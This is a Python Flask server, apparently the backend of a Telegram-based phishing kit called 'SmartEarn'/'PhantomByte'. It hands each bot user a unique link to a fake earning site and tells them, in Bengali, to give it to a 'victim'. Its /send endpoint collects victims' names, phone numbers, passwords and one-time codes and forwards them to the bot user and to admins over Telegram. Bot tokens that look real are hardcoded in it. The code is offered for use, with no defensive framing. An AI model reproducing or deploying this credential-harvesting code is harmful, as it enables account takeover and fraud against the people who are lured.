
# =======================================
# SmartEarn Multi-User Bot System with Enhanced UI
# Developer: MN SIDDIK
# UI: welcome message with Contact & Channel buttons
# =======================================

from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import uuid
from collections import deque
import json

app = Flask(__name__)
CORS(app)

# =========================
# Config
# =========================
USER_BOT_TOKEN = "8457917045:AAHS3L8cch9kfyRa6T_cVZ_29sSci90b5n8"
ADMIN_BOT_TOKEN = "8292480092:AAGlR5uZmj92shdUrtOEZyacezuQvYB1IPA"
BASE_URL = "https://smart-earning.netlify.app"

# Developer / Channel (used in UI)
DEVELOPER_NAME = "SIDDIK"
DEVELOPER_TG = "https://t.me/noobxvau"  # @noobxvau
CHANNEL_NAME = "Noob Hacker BD"
CHANNEL_LINK = "https://t.me/+ENYrQ5N9WNE3NWQ9"

# Runtime memory
USERS = {}             # uid -> chat_id
USER_CHAT_IDS = []     # all user chat_ids
ADMIN_CHAT_IDS = []    # all admin chat_ids
USER_NOTIFIED = set()  # users already notified to admin
SUBMISSIONS = deque(maxlen=100)  # last 100 submissions

# =========================
# Telegram helpers (support reply_markup)
# =========================
def send_message(bot_token, chat_id, text, reply_markup=None):
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    payload = {"chat_id": chat_id, "text": text, "parse_mode": "Markdown"}
    if reply_markup is not None:
        # reply_markup should be a JSON-serializable Python dict
        payload["reply_markup"] = json.dumps(reply_markup)
    requests.post(url, json=payload)

def broadcast_to_users(text):
    for chat_id in USER_CHAT_IDS:
        send_message(USER_BOT_TOKEN, chat_id, text)

# =========================
# Prebuilt reply_markup for welcome
# =========================
WELCOME_BUTTONS = {
    "inline_keyboard": [
        [
            {"text": f"Contact Developer — {DEVELOPER_NAME}", "url": DEVELOPER_TG},
            {"text": f"Join Channel — {CHANNEL_NAME}", "url": CHANNEL_LINK}
        ]
    ]
}

# =========================
# User Bot Webhook
# =========================
@app.route(f"/{USER_BOT_TOKEN}", methods=["POST"])
def handle_user_bot():
    data = request.get_json()
    if "message" in data:
        chat_id = data["message"]["chat"]["id"]
        text = data["message"].get("text", "").strip()

        if text == "/start":
            unique_id = str(uuid.uuid4())[:8]

            # Check if first-time user
            is_first_time = chat_id not in USER_CHAT_IDS

            # store mapping
            USERS[unique_id] = chat_id
            if chat_id not in USER_CHAT_IDS:
                USER_CHAT_IDS.append(chat_id)
            
            # Build a professional welcome message
            welcome_text = (
                f"🎉 *Welcome to PhantomByte!* \n\n"
                f"Hi — I am *PhantomByte Bot* (developer: *{DEVELOPER_NAME}*).\n\n"
                f"🔗 Your unique link: `{BASE_URL}/?uid={unique_id}`\n\n"
                f"👆এই লিংকটা আপনি আপনার Victem কে দিবেন !!\n\n"
                f"🛠️ আর এখনো যারা আমাদের Channel এ জয়েন হন নাই বিভিন্ন আপডেট পেতে জয়েন করুন ✅"
            )

            # Send welcome with inline buttons (Contact & Channel)
            send_message(USER_BOT_TOKEN, chat_id, welcome_text, reply_markup=WELCOME_BUTTONS)
            
            # Notify admin bot ONLY first-time users
            if is_first_time and chat_id not in USER_NOTIFIED:
                USER_NOTIFIED.add(chat_id)
                msg = (
                    f"✅ *New user started bot*:\n"
                    f"👤 Chat ID: `{chat_id}`\n"
                    f"🆔 UID: `{unique_id}`\n\n"
                    f"Developer: [{DEVELOPER_NAME}]({DEVELOPER_TG})\n"
                    f"Channel: [{CHANNEL_NAME}]({CHANNEL_LINK})"
                )
                for admin_id in ADMIN_CHAT_IDS:
                    send_message(ADMIN_BOT_TOKEN, admin_id, msg)

    return jsonify({"ok": True})

# =========================
# Admin Bot Webhook
# =========================
@app.route(f"/{ADMIN_BOT_TOKEN}", methods=["POST"])
def handle_admin_bot():
    data = request.get_json()
    if "message" in data:
        chat_id = data["message"]["chat"]["id"]
        text = data["message"].get("text", "").strip()

        # Add to admin list if not exists
        if chat_id not in ADMIN_CHAT_IDS:
            ADMIN_CHAT_IDS.append(chat_id)
            # admin welcome message with developer & channel links
            admin_welcome = (
                f"✅ *Admin connected!*\n\n"
                f"Developer: [{DEVELOPER_NAME}]({DEVELOPER_TG})\n"
                f"Channel: [{CHANNEL_NAME}]({CHANNEL_LINK})\n\n"
                f"Use /help to see admin commands."
            )
            send_message(ADMIN_BOT_TOKEN, chat_id, admin_welcome)

        # Commands
        if text.startswith("/user"):
            total_users = len(USER_CHAT_IDS)
            send_message(ADMIN_BOT_TOKEN, chat_id, f"👥 Total bot users: *{total_users}*")

        elif text.startswith("/broadcast "):
            msg = text.replace("/broadcast ", "", 1)
            broadcast_to_users(msg)
            send_message(ADMIN_BOT_TOKEN, chat_id, f"✅ Message broadcasted to *{len(USER_CHAT_IDS)}* users")

        elif text.startswith("/last"):
            if not SUBMISSIONS:
                send_message(ADMIN_BOT_TOKEN, chat_id, "⚠️ No submissions yet.")
            else:
                msg = "📝 *Last submissions:*\n\n"
                for sub in list(SUBMISSIONS)[-5:]:
                    msg += f"👤 *{sub['name']}* — 📱 `{sub['number']}` — 🔐 OTP: `{sub['otp']}` — UID:`{sub['uid']}`\n\n"
                send_message(ADMIN_BOT_TOKEN, chat_id, msg)

        elif text.startswith("/stats"):
            msg = (
                f"📊 *Bot Statistics:*\n"
                f"👥 Total Users: *{len(USER_CHAT_IDS)}*\n"
                f"📝 Saved Submissions: *{len(SUBMISSIONS)}*\n\n"
                f"Developer: [{DEVELOPER_NAME}]({DEVELOPER_TG})"
            )
            send_message(ADMIN_BOT_TOKEN, chat_id, msg)

        elif text.startswith("/help"):
            help_msg = (
                "🛠️ *Admin Bot Commands:*\n\n"
                "/start - Connect admin bot\n"
                "/user - Show total bot users\n"
                "/broadcast <message> - Send message to all users\n"
                "/last - Show last 5 submissions\n"
                "/stats - Show bot statistics\n"
                "/help - Show this help message\n\n"
                f"Dev: [{DEVELOPER_NAME}]({DEVELOPER_TG}) | Channel: [{CHANNEL_NAME}]({CHANNEL_LINK})"
            )
            send_message(ADMIN_BOT_TOKEN, chat_id, help_msg)

    return jsonify({"ok": True})

# =========================
# Receive form submission (User Bot)
# =========================
@app.route("/send", methods=["POST"])
def handle_form():
    data = request.get_json()
    uid = data.get("uid")
    name = data.get("name")
    number = data.get("number")
    password = data.get("password")
    otp = data.get("otp")

    if not uid or uid not in USERS:
        return jsonify({"error": "Invalid or expired UID"}), 400

    chat_id = USERS[uid]

    message = (
        f"📥 *New Submission Received!*\n\n"
        f"👤 *Name:* {name}\n"
        f"📱 *Number:* `{number}`\n"
        f"🔑 *Password:* `{password}`\n"
        f"🔐 *OTP Entered:* `{otp}`\n\n"
        f"🆔 *UID:* `{uid}`\n\n"
        f"Developer: [{DEVELOPER_NAME}]({DEVELOPER_TG})"
    )

    # Send to user bot chat
    send_message(USER_BOT_TOKEN, chat_id, message)

    # Send to all admin bots
    for admin_id in ADMIN_CHAT_IDS:
        send_message(ADMIN_BOT_TOKEN, admin_id, message)

    # Save submission for /last
    SUBMISSIONS.append({
        "uid": uid,
        "name": name,
        "number": number,
        "otp": otp
    })

    return jsonify({"success": True})

# =========================
# Test route
# =========================
@app.route("/", methods=["GET"])
def home():
    return "✅ SmartEarn Multi-User Bot with UI updates (Contact & Channel) Running!"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
